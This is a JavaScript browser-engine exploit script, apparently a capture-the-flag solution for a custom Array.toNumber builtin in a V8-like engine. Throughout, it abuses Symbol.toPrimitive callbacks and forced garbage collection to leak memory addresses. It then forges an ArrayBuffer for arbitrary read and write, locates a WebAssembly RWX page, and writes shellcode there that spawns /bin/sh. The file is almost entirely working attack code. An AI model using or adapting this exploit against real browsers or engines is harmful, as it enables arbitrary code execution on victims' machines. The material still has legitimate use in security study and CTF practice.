class Memory{
    constructor(){
        this.buf = new ArrayBuffer(8);
        this.u32 = new Uint32Array(this.buf);
        this.f64 = new Float64Array(this.buf);
    }
    u2f(val){
        let tmp = [];
        tmp[0] = parseInt(val % 0x100000000);
        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
        this.u32.set(tmp);
        return this.f64[0];
    }
    f2u(val){
        this.f64[0] = val;
        let tmp = Array.from(this.u32);
        return tmp[0] + tmp[1] * 0x100000000;
    }
}
mem = new Memory();

function gc() {
    for (let i = 0; i < 0x10;i++){
        new ArrayBuffer(0x10000000);
    }
}

ArrayBuffer.prototype[Symbol.toPrimitive]  = function (hint) {
    console.log("[*][*] toPrimitive called");
    fake_arr_buffer = this;
    ArrayBuffer.prototype[Symbol.toPrimitive] = undefined;
    return 0;
};


var evil_obj = {
    [Symbol.toPrimitive](hint){
        arr.length = 1;
        gc();
        gc();
        arr.length = 32;
        return 0;
    }
};

var arr = [evil_obj, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1];
var vicbuf = new ArrayBuffer(0x430);
var result = Array.toNumber(arr);

var arraybuffer_map = mem.f2u(result[1]);
var arraybuffer_prop = mem.f2u(result[2]);
var arraybuffer_elements= mem.f2u(result[3]);
var result_fixbuff_addr = mem.f2u(result[15]);

console.log("[*] Leak ArrayBuffer map is 0x" + arraybuffer_map.toString(16));
console.log("[*] Leak ArrayBuffer prop is 0x" + arraybuffer_prop.toString(16));
console.log("[*] Leak ArrayBuffer elements is 0x" + arraybuffer_elements.toString(16));
console.log("[*] result fixarry addr is 0x" + result_fixbuff_addr.toString(16));


var evil_obj1 = {
    [Symbol.toPrimitive](hint){
        arr1.length = 1;
        gc();
        gc();
        arr1.length = 32;
        return 0;
    }
};

var fake = [mem.u2f(arraybuffer_map-0xf00),mem.u2f(arraybuffer_prop),mem.u2f(arraybuffer_prop),mem.u2f(0x430),mem.u2f(arraybuffer_elements-1),mem.u2f(2),mem.u2f(0),mem.u2f(0)];
var arr1 = [evil_obj1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1];
var result1 = Array.toNumber(arr1);


console.log("Fake array is :");


fake_arraybuffaddr = mem.f2u(result1[7]);


fake_ArrAyBuffer = fake_arraybuffaddr - 0x120;
console.log("[*] Leak fake_Arraybuffer addr is 0x" + fake_ArrAyBuffer.toString(16));




var fake_arr_buffer;

var evil_obj2 = {
    [Symbol.toPrimitive](hint){
        arr_2.length = 1;
        gc();
        gc();
        arr_2.length = 18;
        return 0;
    }
};

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,116,101,115,116,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,32,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.test;

var arr_2 = [evil_obj2, 1.1,1.2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1];
var double_arr = [mem.u2f(fake_ArrAyBuffer),f];

fff=Array.toNumber(arr_2);


leakfun = mem.f2u(fff[7]) + 0x428;
console.log("[*] leak function addr is 0x" + leakfun.toString(16));


class ARW{
    read(addr){
        fake[4] = mem.u2f(addr);
        let tmp = new Float64Array(fake_arr_buffer,0,8);
        return mem.f2u(tmp[0]);
    }
    write(addr, val){
        fake[4] = mem.u2f(addr);
        let tmp = new Float64Array(fake_arr_buffer,0,8);
        tmp.set([mem.u2f(val)]);
    }
    writebuf(addr, data){
        fake[4] = mem.u2f(addr);
        let u8 = new Uint8Array(fake_arr_buffer);
        for (let i = 0 ; i < data.length; i++){
            u8[i] = data[i];
        }
    }
}

let arw = new ARW();

let shared_info = arw.read(leakfun - 1 + 0x18);
console.log("[*] leak shared_info is 0x" + shared_info.toString(16));
let Wasmdata = arw.read(shared_info - 1 + 0x8);
console.log("[*] leak Wasmdata addr is 0x" + Wasmdata.toString(16));
let instance_addr = arw.read(Wasmdata - 1 + 0x10);
console.log("[*] leak instance addr is " + instance_addr.toString(16));
let rwxmap = arw.read(instance_addr - 1 + 0x88);
console.log("[*] leak rwx map is 0x" + rwxmap.toString(16));


let sc = [0x50,0x48,0x31,0xc0,0x48,0x31,0xd2,0x48,0x31,0xf6,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x53,0x54,0x5f,0xb0,0x3b,0x0f,0x05];

arw.writebuf(rwxmap,sc);
f();





